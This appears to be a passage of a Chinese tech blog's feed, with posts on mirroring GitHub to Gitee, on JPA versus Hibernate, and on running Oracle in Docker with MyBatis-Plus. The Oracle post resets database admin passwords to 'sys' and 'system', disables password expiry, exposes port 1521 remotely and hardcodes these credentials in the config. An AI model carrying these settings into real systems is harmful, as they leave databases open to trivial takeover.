class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Sync-GitHub-to-Gitee</span></span><br><span class="line"><span class="attr">on:</span> <span class="string">push</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">sync:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">source</span> <span class="string">codes</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Mirror</span> <span class="string">Github</span> <span class="string">to</span> <span class="string">Gitee</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">Yikun/hub-mirror-action@master</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="comment"># 必选，需要同步的Github用户（源），需要在脚本中编写</span></span><br><span class="line">          <span class="attr">src:</span> <span class="string">github/Ethan-0822</span> </span><br><span class="line">          <span class="comment"># 必选，需要同步到的Gitee的用户（目的），需要在脚本中编写</span></span><br><span class="line">          <span class="attr">dst:</span> <span class="string">gitee/ethan1996</span> </span><br><span class="line">          <span class="comment"># 必选，Gitee公钥对应的私钥，https://gitee.com/profile/sshkeys</span></span><br><span class="line">          <span class="attr">dst_key:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITEE_PRIVATE_KEY</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="comment"># 必选，Gitee对应的用于创建仓库的token，https://gitee.com/profile/personal_access_tokens</span></span><br><span class="line">          <span class="attr">dst_token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITEE_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="comment"># 直接取当前项目的仓库名</span></span><br><span class="line">          <span class="attr">static_list:</span> <span class="string">$&#123;&#123;</span> <span class="string">github.event.repository.name</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">debug:</span> <span class="literal">true</span>  <span class="comment"># 启用后会显示所有执行命令</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li>上述脚本有4个变量必选项，2个变量（<code>src</code>和<code>dst</code>）的数值在脚本中编写，2个变量（<code>dst_key</code>和<code>dst_token</code>）下文中加入</li></ul><h3 id="⭐两个变量"><a href="#⭐两个变量" class="headerlink" title="⭐两个变量"></a>⭐两个变量</h3><h4 id="🥝gitee准备工作"><a href="#🥝gitee准备工作" class="headerlink" title="🥝gitee准备工作"></a>🥝gitee准备工作</h4><ul><li><a href="https://gitee.com/help/articles/4181#article-header0">生成公私钥教程</a>，生成后在window环境下的路径为<code>C:\Users\电脑名字\.ssh</code>，后缀名<code>.pub</code>为公钥，同名没有后缀名的为私钥。在gitee中输入公钥<ul><li><img src="http://pic.baicai.icu/Github自动将代码同步到Gitee.assets/添加公钥.png" alt="添加公钥"></li></ul></li><li><a href="https://gitee.com/personal_access_tokens">生成私人令牌</a>，<strong><font color="#ef7050">「注意私人令牌只显示一次」</font></strong><ul><li><img src="http://pic.baicai.icu/Github自动将代码同步到Gitee.assets/私人令牌.png" alt="私人令牌"></li></ul></li></ul><h4 id="🥝在github仓库中添加剩下的两个变量"><a href="#🥝在github仓库中添加剩下的两个变量" class="headerlink" title="🥝在github仓库中添加剩下的两个变量"></a>🥝在github仓库中添加剩下的两个变量</h4><ul><li><p>打开在仓库的<code>Secrets</code>，变量<code>GITEE_PRIVATE_KEY</code>的数值为私钥，变量<code>GITEE_TOKEN</code>的数值为私人令牌</p></li><li><p><img src="http://pic.baicai.icu/Github自动将代码同步到Gitee.assets/Secrets.png" alt="Secrets"></p></li><li><p><img src="http://pic.baicai.icu/Github自动将代码同步到Gitee.assets/填写gitee的秘钥和个人令牌.png" alt="填写gitee的秘钥和个人令牌"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;⭐创建自己工作流&quot;&gt;&lt;a href=&quot;#⭐创建自己工作流&quot; class=&quot;headerlink&quot; title=&quot;⭐创建自己工作流&quot;&gt;&lt;/a&gt;⭐创建自己工作流&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;打开Github仓库，在&lt;code&gt;Actions&lt;/code&gt;创建自己的工作流</summary>
      
    
    
    
    <category term="技术" scheme="https://baicai.icu/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="GitHub仓库" scheme="https://baicai.icu/tags/GitHub%E4%BB%93%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>来说说JPA、Hibernate、Spring Data JPA之间的什么关系</title>
    <link href="https://baicai.icu/posts/8fdb6705.html"/>
    <id>https://baicai.icu/posts/8fdb6705.html</id>
    <published>2022-03-23T18:39:56.000Z</published>
    <updated>2022-12-06T18:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="⭐Java持久层框架访问数据库的方式"><a href="#⭐Java持久层框架访问数据库的方式" class="headerlink" title="⭐Java持久层框架访问数据库的方式"></a>⭐Java持久层框架访问数据库的方式</h3><ul><li>大致分为两种：<ul><li>一种以 SQL 核心，封装一定程度的 JDBC 操作，比如： MyBatis。另一种是以 Java 实体类为核心，将实体类的和数据库表之间建立映射关系，也就是我们说的ORM框架，如：Hibernate、Spring Data JPA。</li></ul></li></ul><p><br/></p><h3 id="⭐JPA"><a href="#⭐JPA" class="headerlink" title="⭐JPA"></a>⭐JPA</h3><ul><li><p>Spring Data JPA是建立的JPA的基础之上， 那到底什么是JPA呢？</p><ul><li>我们都知道不同的数据库厂商都有自己的实现类，后来统一规范也就有了数据库驱动，Java在操作数据库的时候，底层使用的其实是JDBC，而JDBC是一组操作不同数据库的规范。我们的Java应用程序，只需要调用JDBC提供的API就可以访问数据库了，而JPA也是类似的道理。</li></ul></li><li><p>JPA全称为Java Persistence API（Java持久层API），它是Sun公司在JavaEE 5中提出的Java持久化规范。它为Java开发人员提供了一种对象/关联映射工具，来管理Java应用中的关系数据，JPA吸取了目前Java持久化技术的优点，旨在规范、简化Java对象的持久化工作。很多ORM框架都是实现了JPA的规范，如：Hibernate、EclipseLink。</p></li></ul><p><br/></p><h3 id="⭐JPA规范"><a href="#⭐JPA规范" class="headerlink" title="⭐JPA规范"></a>⭐JPA规范</h3><ul><li><p>需要注意的是JPA统一了Java应用程序访问ORM框架的规范。JPA为我们提供了以下规范：</p><ul><li><p>ORM映射元数据：JPA支持XML和注解两种元数据的形式，元数据描述对象和表之间的映射关系，框架据此将实体对象持久化到数据库表中。</p></li><li><p>JPA 的API：用来操作实体对象，执行CRUD操作，框架在后台替我们完成所有的事情，开发人员不用再写SQL了。</p></li><li><p>JPQL查询语言：通过面向对象而非面向数据库的查询语言查询数据，避免程序的SQL语句紧密耦合。</p></li></ul></li></ul><p><br/></p><h3 id="⭐Hibernate"><a href="#⭐Hibernate" class="headerlink" title="⭐Hibernate"></a>⭐Hibernate</h3><ul><li><p>Hibernate是Java中的对象关系映射解决方案。对象关系映射或ORM框架是将应用程序数据模型对象映射到关系数据库表的技术。Hibernate 不仅关注于从 Java 类到数据库表的映射，也有 Java 数据类型到 SQL 数据类型的映射。</p></li><li><p>Hibernate 和 JPA是什么关系呢？</p><ul><li>上面我们介绍到JPA是Java EE 5规范中提出的Java持久化接口，而Hibernate是一个ORM框架</li></ul></li><li><p>JPA和Hibernate的关系？</p><ul><li>JPA是一个规范，而不是框架</li><li>Hibernate是JPA的一种实现，是一个框架</li></ul></li></ul><p><br/></p><h3 id="⭐Spring-Data是啥"><a href="#⭐Spring-Data是啥" class="headerlink" title="⭐Spring Data是啥"></a>⭐Spring Data是啥</h3><ul><li><p>Spring Data是Spring 社区的一个子项目，主要用于简化数据（关系型&amp;非关系型）访问，其主要目标是使得数据库的访问变得方便快捷。</p></li><li><p>它提供很多模板操作</p><ul><li>Spring Data Elasticsearch</li><li>Spring Data MongoDB</li><li>Spring Data Redis</li><li>Spring Data Solr</li><li>强大的 Repository 和定制的数据储存对象的抽象映射</li><li>对数据访问对象的支持</li></ul></li></ul><p><br/></p><h3 id="⭐Spring-Data-JPA"><a href="#⭐Spring-Data-JPA" class="headerlink" title="⭐Spring Data JPA"></a>⭐Spring Data JPA</h3><ul><li><p>Spring Data JPA是在实现了JPA规范的基础上封装的一套 JPA 应用框架，虽然ORM框架都实现了JPA规范，但是在不同的ORM框架之间切换仍然需要编写不同的代码，而<code>使用Spring Data JPA能够方便大家在不同的ORM框架之间进行切换而不需要更改代码</code>。Spring Data JPA旨在通过将统一ORM框架的访问持久层的操作，来提高开发人的效率。</p></li><li><p>Spring Data JPA和Hibernate的关系</p><ul><li>Hibernate其实是JPA的一种实现，而Spring Data JPA是一个JPA数据访问抽象。也就是说Spring Data JPA不是一个实现或JPA提供的程序，它只是一个抽象层，主要用于减少为各种持久层存储实现数据访问层所需的样板代码量。但是它还是需要JPA提供实现程序，其实Spring Data JPA底层就是使用的 Hibernate实现。</li></ul></li></ul><p><br/></p><h3 id="⭐总结"><a href="#⭐总结" class="headerlink" title="⭐总结"></a>⭐总结</h3><ul><li>Hibernate是JPA的一种实现，是一个框架</li><li>Spring Data JPA是一种JPA的抽象层，底层依赖Hibernate</li></ul><h3 id="📚参考文档"><a href="#📚参考文档" class="headerlink" title="📚参考文档"></a>📚参考文档</h3><ul><li><a href="https://www.1024sou.com/article/319912.html">来说说JPA、Hibernate、Spring Data JPA之间的什么关系</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;⭐Java持久层框架访问数据库的方式&quot;&gt;&lt;a href=&quot;#⭐Java持久层框架访问数据库的方式&quot; class=&quot;headerlink&quot; title=&quot;⭐Java持久层框架访问数据库的方式&quot;&gt;&lt;/a&gt;⭐Java持久层框架访问数据库的方式&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="技术" scheme="https://baicai.icu/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="ORM" scheme="https://baicai.icu/tags/ORM/"/>
    
  </entry>
  
  <entry>
    <title>Oracle部署及入门</title>
    <link href="https://baicai.icu/posts/d53d7bbc.html"/>
    <id>https://baicai.icu/posts/d53d7bbc.html</id>
    <published>2022-03-21T18:39:56.000Z</published>
    <updated>2022-12-06T18:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="⭐部署Oracle环境"><a href="#⭐部署Oracle环境" class="headerlink" title="⭐部署Oracle环境"></a>⭐部署Oracle环境</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拉取镜像</span></span><br><span class="line">docker pull registry.aliyuncs.com/helowin/oracle_11g</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建容器，容器名字：oracle，-p 1521【外部端口】：1521【容器内部接口】 指定拉取的oracle镜像</span></span><br><span class="line">docker create --name oracle -p 1521:1521 registry.aliyuncs.com/helowin/oracle_11g</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动并查看oracle日志</span></span><br><span class="line">docker start oracle &amp;&amp; docker logs -f oracle</span><br><span class="line"></span><br><span class="line"><span class="comment">#进入镜像配置</span></span><br><span class="line">docker <span class="built_in">exec</span> -it oracle bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到Oracle的root用户</span></span><br><span class="line">su - root</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入镜像root密码</span></span><br><span class="line">helowin</span><br><span class="line"></span><br><span class="line"><span class="comment">#编辑Oracle环境变量</span></span><br><span class="line">vi /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">#在文件末未添加</span></span><br><span class="line"><span class="built_in">export</span> ORACLE_HOME=/home/oracle/app/oracle/product/11.2.0/dbhome_2</span><br><span class="line"><span class="built_in">export</span> ORACLE_SID=helowin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$ORACLE_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使文件生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建软链接</span></span><br><span class="line"><span class="built_in">ln</span> -s <span class="variable">$ORACLE_HOME</span>/bin/sqlplus /usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换oracle用户</span></span><br><span class="line">su - oracle</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行数据库相关用户的修改与配置信息的修改</span></span><br><span class="line">sqlplus /nolog</span><br><span class="line"></span><br><span class="line"><span class="comment">#连接数据库</span></span><br><span class="line">conn / as sysdba</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改system用户账号</span></span><br><span class="line">alter user system identified by system;</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改sys用户账号</span></span><br><span class="line">alter user sys identified by sys;</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改密码规则策略为密码永不过期</span></span><br><span class="line">ALTER PROFILE DEFAULT LIMIT PASSWORD_LIFE_TIME UNLIMITED;</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭数据库</span></span><br><span class="line">shutdown immediate;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动数据库</span></span><br><span class="line">startup;</span><br></pre></td></tr></table></figure><ul><li><img src="http://pic.baicai.icu/mybatisplus.assets/部署Oracle环境之1启动.png" alt="部署Oracle环境之1启动"></li><li><img src="http://pic.baicai.icu/mybatisplus.assets/部署Oracle环境之2使用root用户修改环境变量.png" alt="部署Oracle环境之2使用root用户修改环境变量"></li><li><img src="http://pic.baicai.icu/mybatisplus.assets/部署Oracle环境之3插入Oracle环境变量.png" alt="部署Oracle环境之3插入Oracle环境变量"></li><li><img src="http://pic.baicai.icu/mybatisplus.assets/部署Oracle环境之4执行数据库相关用户的修改与配置信息的修改.png" alt="部署Oracle环境之4执行数据库相关用户的修改与配置信息的修改"></li></ul><p><br/></p><h3 id="⭐使用navicat登录"><a href="#⭐使用navicat登录" class="headerlink" title="⭐使用navicat登录"></a>⭐使用navicat登录</h3><ul><li><strong><font color="#ef7050">「如果使用了云服务器或第三方运维工具（如宝塔面板），记得开放相对应的端口」</font></strong></li><li><img src="http://pic.baicai.icu/mybatisplus.assets/部署Oracle环境之Navicat远程登录.png" alt="部署Oracle环境之Navicat远程登录"></li></ul><p><br/></p><h3 id="⭐Java编码说明"><a href="#⭐Java编码说明" class="headerlink" title="⭐Java编码说明"></a>⭐Java编码说明</h3><ul><li>在mysql中，主键往往是自增长的，这样使用起来是比较方便的，如果使用的是Oracle数据库，那么就不能使用自增长了，就得使用Sequence 序列生成id值了</li></ul><p><br/></p><h3 id="⭐创建表以及序列"><a href="#⭐创建表以及序列" class="headerlink" title="⭐创建表以及序列"></a>⭐创建表以及序列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--创建表，表名以及字段名都要大写</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> &quot;TB_USER&quot; (</span><br><span class="line">&quot;ID&quot; NUMBER(<span class="number">20</span>)  <span class="keyword">NOT</span> <span class="keyword">NULL</span> ,</span><br><span class="line">&quot;USER_NAME&quot; VARCHAR2(<span class="number">255</span> BYTE)  ,</span><br><span class="line">&quot;PASSWORD&quot; VARCHAR2(<span class="number">255</span> BYTE)  ,</span><br><span class="line">&quot;NAME&quot; VARCHAR2(<span class="number">255</span> BYTE)  ,</span><br><span class="line">&quot;AGE&quot; NUMBER(<span class="number">10</span>)  ,</span><br><span class="line">&quot;EMAIL&quot; VARCHAR2(<span class="number">255</span> BYTE) </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">--创建序列</span></span><br><span class="line"><span class="comment">--从1开始，每次自增1</span></span><br><span class="line"><span class="keyword">CREATE</span> SEQUENCE SEQ_USER <span class="keyword">START</span> <span class="keyword">WITH</span> <span class="number">1</span> INCREMENT <span class="keyword">BY</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p><br/></p><h3 id="⭐jdbc驱动包"><a href="#⭐jdbc驱动包" class="headerlink" title="⭐jdbc驱动包"></a>⭐jdbc驱动包</h3><ul><li><p>将<code>ojdbc8</code>复制到项目的根目录，使用idea中的maven命令导入该jar包，导包命令：    </p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mvn</span> <span class="string">install:install-file -DgroupId=com.oracle -DartifactId=ojdbc8 -Dversion=12.1.0.1 -Dpackaging=jar -Dfile=ojdbc8.jar</span></span><br></pre></td></tr></table></figure><ul><li><p><img src="http://pic.baicai.icu/mybatisplus.assets/maven命令导入该本地ar包1.png" alt="maven命令导入该本地ar包1"></p></li><li><p><img src="http://pic.baicai.icu/mybatisplus.assets/maven命令导入该本地ar包2.png" alt="maven命令导入该本地ar包2"></p></li></ul></li><li><p>出现<code>BUILD SUCCESS</code>就成功导入</p></li><li><p>导入载oracle数据库坐标    </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.oracle<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ojdbc8<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>12.1.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p><br/></p><h3 id="⭐修改application-properties"><a href="#⭐修改application-properties" class="headerlink" title="⭐修改application.properties"></a>⭐修改application.properties</h3><ul><li>修改oracle连接信息</li><li>修改oracle全局id的生成策略</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring.application.name</span> = <span class="string">Springboot</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#mysql连接信息</span></span><br><span class="line"><span class="comment">#spring.datasource.driver-class-name=com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="comment">#spring.datasource.url=jdbc:mysql://127.0.0.1:3306/mp?useUnicode=true&amp;characterEncoding=utf8&amp;autoReconnect=true&amp;allowMultiQueries=true&amp;useSSL=false</span></span><br><span class="line"><span class="comment">#spring.datasource.username=root</span></span><br><span class="line"><span class="comment">#spring.datasource.password=root</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#oracle连接信息</span></span><br><span class="line"><span class="comment">#数据库连接配置</span></span><br><span class="line"><span class="attr">spring.datasource.driver-class-name</span>=<span class="string">oracle.jdbc.OracleDriver</span></span><br><span class="line"><span class="attr">spring.datasource.url</span>=<span class="string">jdbc:oracle:thin:@服务器ip地址:1521:helowin</span></span><br><span class="line"><span class="attr">spring.datasource.username</span>=<span class="string">system</span></span><br><span class="line"><span class="attr">spring.datasource.password</span>=<span class="string">system</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#指定全局的配置文件</span></span><br><span class="line"><span class="attr">mybatis-plus.config-location</span>=<span class="string">classpath:mybatis-config.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#指定mapper.xml文件的路径</span></span><br><span class="line"><span class="attr">mybatis-plus.mapper-locations</span> = <span class="string">classpath*:mybatis/*.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#实体对象的扫描包</span></span><br><span class="line"><span class="attr">mybatis-plus.type-aliases-package</span> = <span class="string">mp.pojo</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#mysql全局id的生成策略</span></span><br><span class="line"><span class="comment">#mybatis-plus.global-config.db-config.id-type=auto</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#oracle全局id的生成策略【该ID值其实由springboot配置类中配置oracle的序列生成器生成并填入】</span></span><br><span class="line"><span class="attr">mybatis-plus.global-config.db-config.id-type</span>=<span class="string">input</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#全局表名的前缀</span></span><br><span class="line"><span class="attr">mybatis-plus.global-config.db-config.table-prefix</span>=<span class="string">tb_</span></span><br></pre></td></tr></table></figure><p><br/></p><h3 id="⭐springboot配置类中配置oracle序列生成器"><a href="#⭐springboot配置类中配置oracle序列生成器" class="headerlink" title="⭐springboot配置类中配置oracle序列生成器"></a>⭐springboot配置类中配置oracle序列生成器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;mp.SpringBootMapper&quot;)</span> <span class="comment">//设置mapper接口的扫描包</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisPlusConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span>   <span class="comment">//配置分页插件</span></span><br><span class="line">    <span class="keyword">public</span> PaginationInterceptor <span class="title function_">paginationInterceptor</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PaginationInterceptor</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span>   <span class="comment">//oracle的序列生成器</span></span><br><span class="line">    <span class="keyword">public</span> OracleKeyGenerator <span class="title function_">oracleKeyGenerator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OracleKeyGenerator</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br/></p><h3 id="⭐在实体对象中指定序列的名称"><a href="#⭐在实体对象中指定序列的名称" class="headerlink" title="⭐在实体对象中指定序列的名称"></a>⭐在实体对象中指定序列的名称</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//value的值为oracle创建的序列名称，clazz匹配id生成的java类型【该User类将id设置为Long类型】</span></span><br><span class="line"><span class="meta">@KeySequence(value = &quot;SEQ_USER&quot;,clazz = Long.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_">Model</span>&lt;User&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br/></p><h3 id="⭐测试用例"><a href="#⭐测试用例" class="headerlink" title="⭐测试用例"></a>⭐测试用例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用ar方式操作数据库</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    user.setName(<span class="string">&quot;刘备&quot;</span>);</span><br><span class="line">    user.setAge(<span class="number">30</span>);</span><br><span class="line">    user.setPassword(<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">    user.setUserName(<span class="string">&quot;liubei&quot;</span>);</span><br><span class="line">    user.setMail(<span class="string">&quot;liubei@itcast.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//INSERT INTO tb_user ( id, user_name, password, name, age, email ) VALUES ( ?, ?, ?, ?, ?, ? )</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">insert</span> <span class="operator">=</span> user.insert();</span><br><span class="line">    System.out.println(insert);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><img src="http://pic.baicai.icu/mybatisplus.assets/插入成功后远程数据.png" alt="插入成功后远程数据"></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;⭐部署Oracle环境&quot;&gt;&lt;a href=&quot;#⭐部署Oracle环境&quot; class=&quot;headerlink&quot; title=&quot;⭐部署Oracle环境&quot;&gt;&lt;/a&gt;⭐部署Oracle环境&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table</summary>
      
    
    
    
    <category term="技术" scheme="https://baicai.icu/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="ORM" scheme="https://baicai.icu/tags/ORM/"/>
    
  </entry>
  
  <entry>
    <title>分析一下权限认证过程</title>
    <link href="https://baicai.icu/posts/698624a2.html"/>
    <id>https://baicai.icu/posts/698624a2.html</id>
    <published>2022-03-12T18:39:56.000Z</published>
    <updated>2022-12-06T18:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="⭐认证过程的概念"><a href="#⭐认证过程的概念" class="headerlink" title="⭐认证过程的概念"></a>⭐认证过程的概念</h3><h4 id="🥝认证"><a href="#🥝认证" class="headerlink" title="🥝认证"></a>🥝认证</h4><ul><li><p>根据声明者持有的特定信息，来确认声明者的身份</p><ul><li><p>例如身份证、用户名/密码、手机（包括短信、二维码、手势密码）、电子邮箱、生物特征（虹膜、面部、指纹、语音等）</p></li><li><p>高安全要求的场景下，会使用多种认证方式组合进行身份校验，即<strong>多因素认证</strong></p></li></ul></li></ul><p><br/></p><h4 id="🥝授权"><a href="#🥝授权" class="headerlink" title="🥝授权"></a>🥝授权</h4><ul><li>资源所有者委派执行者，赋予其指定范围的权限，执行对资源的操作<ul><li><strong>资源所有者</strong>：拥有资源的所有权利，一般就是资源的拥有者。</li><li><strong>资源执行者</strong>：被委派去执行资源的相关操作。</li><li><strong>操作权限</strong>：可以对资源进行的某种操作。</li><li><strong>资源</strong>：有价值的信息或数据等，受到安全保护。</li><li>其实现方式主要通过一个共信的媒介完成，这个媒介不可被篡改，不可随意伪造，很多时候需要受保护，防止被窃取。<ul><li>现实生活中授权的实现方式，<strong>例如：银行卡、门禁卡、钥匙、公证书等等</strong></li><li>互联网的web服务实现方式，<strong>例如：session机制、浏览器的cookie机制、授权令牌token等等</strong></li></ul></li></ul></li></ul><p><br/></p><h4 id="🥝鉴权"><a href="#🥝鉴权" class="headerlink" 